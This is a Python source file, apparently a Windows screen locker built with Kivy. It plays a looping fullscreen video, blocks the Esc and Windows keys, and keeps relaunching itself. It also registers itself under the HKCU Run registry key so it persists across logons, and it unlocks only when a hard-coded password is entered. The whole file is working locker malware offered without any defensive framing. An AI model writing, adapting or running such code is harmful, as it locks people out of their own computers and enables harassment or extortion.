from threading import Thread
def no_cons():
    from os import system
    while True:
        system('cls||clear')
th2=Thread(target=no_cons,daemon=True)
th2.start()
from kivy.core.window import Window
Window.fullscreen = True
from winreg import *
key_my = OpenKey(HKEY_CURRENT_USER, 
                 r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 
                 0, KEY_ALL_ACCESS)
SetValueEx(key_my, 'script', 0, REG_SZ, __file__)
CloseKey(key_my)
from kivy.app import App
from kivy.uix.floatlayout import FloatLayout
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.video import Video
from kivy.uix.button import Button
from kivy.uix.textinput import TextInput
class main(App):
    def build(self):
        def exeting(self,**argv):
            if ti1.text=='Lappland':
                exit()
        fl1=FloatLayout(size_hint=(.99,.99))
        bl1=BoxLayout(orientation='vertical',size_hint=(1,.25),pos_hint={"center_x":.5,"center_y":.3},spacing=30,padding=10)
        v1=Video(source="vid.mp4",size_hint=(1,1))
        bth1=Button(text='ok',size_hint=(.05, .01),pos_hint={"center_x":.5,"center_y":.4},opacity=0.75)
        bth1.bind(on_press=exeting)
        ti1=TextInput(size_hint=(.5, .01),pos_hint={"center_x":.5,"center_y":.5},multiline=False,opacity=0.75)
        v1.state='play'
        v1.options={'eos':'loop'}
        fl1.add_widget(v1)
        bl1.add_widget(ti1)
        bl1.add_widget(bth1)
        fl1.add_widget(bl1)
        return fl1;
def lock_keyboard():
    from keyboard import block_key,add_hotkey
    add_hotkey("esc",lambda: None,suppress =True)
    add_hotkey("windows",lambda: None,suppress =True)
if __name__=='__main__':
    th1=Thread(target=lock_keyboard,daemon=True)
    th1.start()
    while True:
        main().run()